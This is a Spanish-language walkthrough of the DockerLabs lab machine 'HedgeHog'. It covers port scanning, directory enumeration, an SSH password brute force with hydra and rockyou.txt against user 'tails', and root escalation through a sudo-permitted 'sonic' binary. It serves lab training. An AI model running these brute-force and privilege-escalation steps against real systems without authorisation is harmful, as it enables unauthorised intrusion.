## Introducción

Este documento presenta la resolución completa de la máquina **HedgeHog**, desarrollada por *AnkbNikas* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
El laboratorio expone un servidor web que contiene únicamente un archivo `index` con la palabra "tails", sugiriendo un posible nombre de usuario. Tras enumerar el servicio web sin encontrar otros vectores, se realiza un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`, obteniendo acceso al sistema como el usuario `tails`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar el binario `sonic` sin contraseña, y con la capacidad de ejecutar cualquier comando, lo que facilita una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip HedgeHog.zip
sudo bash auto_deplo.sh HedgeHog.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/ipScan_ifwllz.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p HedgeHog/{content,exploits,nmap,scripts}
cd HedgeHog
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748843915/Ports_hdv74v.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748843973/Services_z6mdav.png)

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Resultados de Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1748843823/Gobuster_a2i8yd.png)

El resultado muestra únicamente el archivo `index`, cuyo contenido es la palabra "tails".

![Archivo index](https://res.cloudinary.com/dewqswzke/image/upload/v1748843858/Index_algfrz.png)

## Paso 2 — Explotación (Acceso inicial)

El contenido del archivo `index` sugiere que "tails" podría ser un nombre de usuario. Al no encontrar otras vulnerabilidades web, se procede a realizar un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`:

```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1748843824/Hydra_nle1nm.png)

Hydra encuentra la contraseña válida, lo que permite acceder al sistema mediante SSH:

```bash
ssh tails@172.17.0.2
```

![Acceso como tails](https://res.cloudinary.com/dewqswzke/image/upload/v1748844022/Tails_cs6e4h.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De tails → root

Al acceder al sistema, se verifican los permisos sudo del usuario:

```bash
sudo -l
```

![sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1748844021/Sudo-l_sadoea.png)

El usuario puede ejecutar el binario `sonic` como cualquier otro usuario sin necesidad de contraseña, con la capacidad de ejecutar cualquier comando.

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo sonic
```

![Acceso root](https://res.cloudinary.com/dewqswzke/image/upload/v1748844020/Sudo_pfpe6x.png)
